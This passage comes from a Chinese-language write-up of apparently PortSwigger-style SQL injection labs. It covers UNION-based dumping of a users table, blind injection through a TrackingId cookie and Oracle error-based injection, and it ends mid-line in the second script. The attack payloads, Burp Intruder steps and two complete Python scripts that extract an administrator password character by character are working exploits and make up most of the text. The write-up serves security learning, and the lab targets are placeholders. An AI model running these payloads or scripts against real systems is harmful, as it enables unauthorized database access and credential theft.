+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查列</span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL, &#x27;</span>cha<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>, table_name <span class="keyword">FROM</span> information_schema.tables<span class="comment">--  //users</span></span><br><span class="line">查列</span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27;--  //username, password</span></span><br><span class="line"><span class="string">通过字符串连接将账号密码串起来</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>, username<span class="operator">||</span><span class="string">&#x27;~&#x27;</span><span class="operator">||</span>password <span class="keyword">FROM</span> users<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">返回结果：</span><br><span class="line">wiener<span class="operator">~</span>ysqrt4zj7g71btq1khij</span><br><span class="line">administrator<span class="operator">~</span><span class="number">76</span>cjhfd73x8k3quk1nya</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h2><p>使用场景：当http响应不返回SQL查询结果或者数据库错误消息</p>
+<h3 id="带条件响应的SQL盲注"><a href="#带条件响应的SQL盲注" class="headerlink" title="带条件响应的SQL盲注"></a>带条件响应的SQL盲注</h3><p>假设一个程序使用包含cookie值的SQL查询，查询结果不会返回，有不显示错误，但是如果查询成功会返回欢迎回归</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span><span class="number">7</span>X57izWwJTjiQlOJ<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>;   <span class="operator">/</span><span class="operator">/</span>welcome back</span><br><span class="line">Cookie: TrackingId<span class="operator">=</span><span class="number">7</span>X57izWwJTjiQlOJ<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>;   <span class="operator">/</span><span class="operator">/</span>无返回显示</span><br></pre></td></tr></table></figure>
+
+<p>子串：从指定偏移和指定长度提取字符串的一部分</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下面返回的都是ba</span><br><span class="line">Oracle      SUBSTR(<span class="string">&#x27;foobar&#x27;</span>, <span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">Microsoft   <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;foobar&#x27;</span>, <span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">PostgreSQL  <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;foobar&#x27;</span>, <span class="number">4</span>, <span class="number">2</span>)</span><br><span class="line">MySQL       <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;foobar&#x27;</span>, <span class="number">4</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>通过数据库返回的报错来推断条件为真</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle      <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual</span><br><span class="line">Microsoft   <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) <span class="keyword">THEN</span> <span class="number">1</span><span class="operator">/</span><span class="number">0</span> <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span></span><br><span class="line">PostgreSQL  <span class="number">1</span> <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) <span class="keyword">THEN</span> <span class="number">1</span><span class="operator">/</span>(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>)</span><br><span class="line">MySQL       <span class="keyword">SELECT</span> IF(YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE,(<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables),<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Hint: 包含一个users 表， 列为 username 和 password</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">确认是否存在<span class="keyword">user</span> 表</span><br><span class="line"><span class="string">&#x27;AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users LIMIT 1)=&#x27;</span>a  <span class="operator">/</span><span class="operator">/</span>welcome bakc</span><br><span class="line"></span><br><span class="line">确认是否存在一个administrator 用户</span><br><span class="line"><span class="string">&#x27; AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a</span><br><span class="line"></span><br><span class="line">确认administrator 密码的字符数</span><br><span class="line"><span class="string">&#x27; AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27; AND LENGTH(password)&gt;19)=&#x27;</span>a  <span class="operator">/</span><span class="operator">/</span>大于<span class="number">19</span> 但不大于<span class="number">20</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27; AND LENGTH(password)=20)=&#x27;</span>a  <span class="operator">/</span><span class="operator">/</span>有<span class="number">20</span>位字符</span><br><span class="line"></span><br><span class="line">爆真值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 先选择intruder 模式， Sniper attack</span><br><span class="line"><span class="string">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>$a$</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 选择brute force 暴力破解模式： 值 <span class="operator">=</span> a<span class="operator">-</span>z, <span class="number">0</span><span class="number">-9</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 再加一个GREP<span class="operator">-</span><span class="keyword">MATCH</span> 匹配 填Welcome back, 就可以开始爆破了</span><br><span class="line"></span><br><span class="line">第二位返回结果：i</span><br><span class="line"></span><br><span class="line">现在爆第二位, 把子串换成 <span class="built_in">SUBSTRING</span>(password,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27; AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>$a$</span><br><span class="line">第二位返回结果:<span class="number">6</span></span><br><span class="line">第三位返回结果:r</span><br><span class="line">......</span><br><span class="line">最终结果：i6r1hvc5lf3ggz7vwde5</span><br></pre></td></tr></table></figure>
+
+<p>但是burpsuite有个坏处就是要每一位爆完都要重新改，所以这里推荐用脚本，也可以自己手注一遍，来了解原理</p>
+<p>这里我用的是多线程二分查找，所以速度会快很多</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入用于发送网络请求的库</span></span><br><span class="line"><span class="keyword">import</span> concurrent.futures  <span class="comment"># 导入用于实现多线程并发执行的库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 基础配置 (需根据浏览器获取的最新的 TrackingId 和 session 进行修改) ---</span></span><br><span class="line">URL = <span class="string">&quot;https://xxxxxx/&quot;</span></span><br><span class="line">SESSION = <span class="string">&quot;xxxx&quot;</span>                   <span class="comment"># 用户当前的会话 Cookie</span></span><br><span class="line">TRACKING_ID = <span class="string">&quot;xxxxx&quot;</span>              <span class="comment"># 原始的 TrackingId，我们将在此处拼接注入语句</span></span><br><span class="line">SUCCESS_MARKER = <span class="string">&quot;Welcome back&quot;</span>    <span class="comment"># 页面返回该字符串代表 SQL 语句执行结果为 &quot;真&quot;</span></span><br><span class="line"></span><br><span class="line">PASSWORD_LENGTH = <span class="number">20</span>  <span class="comment"># 目标 administrator 密码的固定长度</span></span><br><span class="line">results = &#123;&#125;          <span class="comment"># 创建全局字典，用于存放各线程破解出的字符（键为位置，值为字符）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_position</span>(<span class="params">pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数负责利用二分查找算法破解密码中特定位置 (pos) 的单个字符</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    low = <span class="number">32</span>   <span class="comment"># ASCII 可打印字符范围的起始值 (空格)</span></span><br><span class="line">    high = <span class="number">126</span>  <span class="comment"># ASCII 可打印字符范围的结束值 (~)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:  <span class="comment"># 当搜索区间还未重合时持续查找</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span>  <span class="comment"># 取当前范围的中点</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造 SQL 注入 Payload：判断第 pos 位字符的 ASCII 码是否大于 mid</span></span><br><span class="line">        <span class="comment"># SUBSTRING(password,&#123;pos&#125;,1) 取第 pos 位字符；ASCII() 将其转为数字</span></span><br><span class="line">        payload = <span class="string">f&quot;<span class="subst">&#123;TRACKING_ID&#125;</span>&#x27; AND (SELECT ASCII(SUBSTRING(password,<span class="subst">&#123;pos&#125;</span>,1)) FROM users WHERE username=&#x27;administrator&#x27;)&gt;<span class="subst">&#123;mid&#125;</span>--&quot;</span></span><br><span class="line"></span><br><span class="line">        cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: payload, <span class="string">&quot;session&quot;</span>: SESSION&#125;  <span class="comment"># 将 Payload 放入 Cookie 中发送</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(URL, cookies=cookies, timeout=<span class="number">10</span>)  <span class="comment"># 发送 GET 请求，设置 10 秒超时</span></span><br><span class="line">            <span class="keyword">if</span> SUCCESS_MARKER <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="comment"># 如果响应中包含 &quot;Welcome back&quot;，说明判断为真，目标字符在 mid 的右侧</span></span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果判断为假，说明目标字符小于或等于 mid，目标在左侧</span></span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error at pos <span class="subst">&#123;pos&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>  <span class="comment"># 捕获网络异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 二分查找收敛后，low 对应的值即为该位置字符的 ASCII 码</span></span><br><span class="line">    char = <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 位置 <span class="subst">&#123;pos:02d&#125;</span> 破解成功: <span class="subst">&#123;char&#125;</span>&quot;</span>)  <span class="comment"># 实时打印破解进度</span></span><br><span class="line">    <span class="keyword">return</span> pos, char  <span class="comment"># 返回位置索引和对应的字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_multithreaded</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    多线程管理函数：同时开启多个线程进行破解，极大提升效率</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] 启动多线程破解 (最大并行线程数: <span class="subst">&#123;PASSWORD_LENGTH&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 ThreadPoolExecutor 创建线程池</span></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=PASSWORD_LENGTH) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="comment"># 提交 20 个任务（每个任务负责破解密码的一位），生成 future 对象字典</span></span><br><span class="line">        future_to_pos = &#123;executor.submit(crack_position, i): i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PASSWORD_LENGTH + <span class="number">1</span>)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按照线程完成的先后顺序获取结果</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_pos):</span><br><span class="line">            pos, char = future.result()  <span class="comment"># 获取 crack_position 返回的 pos 和 char</span></span><br><span class="line">            results[pos] = char          <span class="comment"># 将结果存入字典，以便后续按正确顺序排序</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据位置索引 (1-20) 从字典提取字符，拼接成完整的最终密码</span></span><br><span class="line">    final_password = <span class="string">&quot;&quot;</span>.join([results[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PASSWORD_LENGTH + <span class="number">1</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 破解完成！administrator 最终密码为: <span class="subst">&#123;final_password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_multithreaded()  <span class="comment"># 脚本运行入口</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当查询不返回任何响应时，可以通过在条件为真时，故意造成错误，来判断真实性</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Microsoft    <span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span> <span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">PostgreSQL   <span class="keyword">SELECT</span> <span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)</span><br><span class="line">MySQL        <span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span> <span class="keyword">WHERE</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> <span class="string">&#x27;secret&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">确定数据库类型</span><br><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27;)||              //state: 500</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span>    <span class="operator">/</span><span class="operator">/</span>state: <span class="number">200</span> 确认是Oracle</span><br><span class="line"></span><br><span class="line">确认是否存在users表且含有至少一行数据</span><br><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM users WHERE ROWNUM = 1)||&#x27;</span>  <span class="operator">/</span><span class="operator">/</span> <span class="number">200</span> ok</span><br><span class="line"></span><br><span class="line">测试条件</span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM dual)||&#x27;</span>   <span class="operator">/</span><span class="operator">/</span> <span class="number">500</span></span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM dual)||&#x27;</span>   <span class="operator">/</span><span class="operator">/</span> <span class="number">200</span></span><br><span class="line">这里说明可以利用当条件为真，来返回报错</span><br><span class="line"></span><br><span class="line">查询是否存在administrator</span><br><span class="line"><span class="string">&#x27;||(SELECE CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span>  <span class="operator">/</span><span class="operator">/</span><span class="number">500</span></span><br><span class="line"></span><br><span class="line">确认管理员密码字符数</span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN LENGHT(password)&gt;20 THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span>  <span class="operator">/</span><span class="operator">/</span><span class="number">200</span></span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span>  <span class="operator">/</span><span class="operator">/</span><span class="number">500</span></span><br><span class="line"></span><br><span class="line">爆破密码</span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#x27;</span>$a$<span class="string">&#x27; THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br><span class="line">第<span class="number">1</span>位：<span class="number">3</span></span><br><span class="line"><span class="string">&#x27;||(SELECT CASE WHEN SUBSTR(password,2,1)=&#x27;</span>§a§<span class="string">&#x27; THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)||&#x27;</span></span><br><span class="line">第<span class="number">2</span>位：<span class="number">0</span></span><br><span class="line">....</span><br><span class="line">最终结果：<span class="number">3</span>o764sluuy1iiilf8l2v</span><br></pre></td></tr></table></figure>
+
+<p>多线程二分查找脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx  <span class="comment"># 导入支持异步和 HTTP/2 的网络库，用于发送 HTTP 请求</span></span><br><span class="line"><span class="keyword">import</span> asyncio <span class="comment"># 导入异步 I/O 库，用于管理并发任务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置区：根据你的实验环境修改这些值 ---</span></span><br><span class="line"><span class="comment"># 目标 Lab 的基础 URL</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;https://xxxxx/&quot;</span></span><br><span class="line"><span class="comment"># 你的登录 Session 追踪 Cookie</span></span><br><span class="line">SESSION_COOKIE = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="comment"># 注入点 TrackingId 的固定前缀</span></span><br><span class="line">TRACKING_ID_BASE = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="comment"># 预期的密码长度，通常为 20 位</span></span><br><span class="line">PASSWORD_LENGTH = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 核心逻辑函数 ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">is_ascii_greater_than</span>(<span class="params">client, pos, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断逻辑函数：通过报错判断第 pos 位的字符 ASCII 码是否大于给定的 value。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 构造 Payload：</span></span><br><span class="line">    <span class="comment"># 1. 使用 SUBSTR 截取第 pos 位字符</span></span><br><span class="line">    <span class="comment"># 2. 使用 ASCII 将其转为数值</span></span><br><span class="line">    <span class="comment"># 3. 使用 CASE WHEN 判断是否大于 value</span></span><br><span class="line">    <span class="comment"># 4. 如果为真，执行 TO_CHAR(1/0) 导致数据库报错（返回 HTTP 500）</span></span><br><span class="line">    payload = <span class="string">f&quot;&#x27;||(SELECT CASE WHEN ASCII(SUBSTR(password,<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;value&#125;</span> THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造请求所需的 Cookies 字典</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;TrackingId&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;TRACKING_ID_BASE&#125;</span><span class="subst">&#123;payload&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;session&quot;</span>: SESSION_COOKIE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送异步异步 GET 请求</span></span><br><span class="line">        <span class="comment"># timeout=10.0 防止网络卡死；follow_redirects=False 提高速度（我们只需要状态码）</span></span><br><span class="line">        resp = <span class="keyword">await</span> client.get(TARGET_URL, cookies=cookies, timeout=<span class="number">10.0</span>, follow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果服务器返回 500，说明 SQL 里的 CASE 逻辑成立（即 ASCII 值大于 value）</span></span><br><span class="line">        <span class="keyword">return</span> resp.status_code == <span class="number">500</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># 如果发生连接错误或超时，返回 False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">find_char</span>(<span class="params">client, pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    二分查找函数：负责确定密码中某一个位置（pos）的字符。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    low = <span class="number">32</span>   <span class="comment"># ASCII 可打印字符的起始值（空格）</span></span><br><span class="line">    high = <span class="number">126</span> <span class="comment"># ASCII 可打印字符的结束值（~号）</span></span><br><span class="line">    result_char = <span class="string">&quot;?&quot;</span> <span class="comment"># 初始化占位符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 标准二分查找循环</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span> <span class="comment"># 取中间值</span></span><br><span class="line">        <span class="comment"># 询问服务器：该位置字符的 ASCII 码是否大于中间值？</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> is_ascii_greater_than(client, pos, mid):</span><br><span class="line">            <span class="comment"># 如果大于，说明字符在右半部分，调高下限</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            result_char = <span class="built_in">chr</span>(low) <span class="comment"># 更新当前推测的字符</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果不大于，说明字符在左半部分或就是当前值，调低上限</span></span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">            result_char = <span class="built_in">chr</span>(low) <span class="comment"># 更新当前推测的字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印当前位置的查找进度</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Position <span class="subst">&#123;pos&#125;</span> determined: 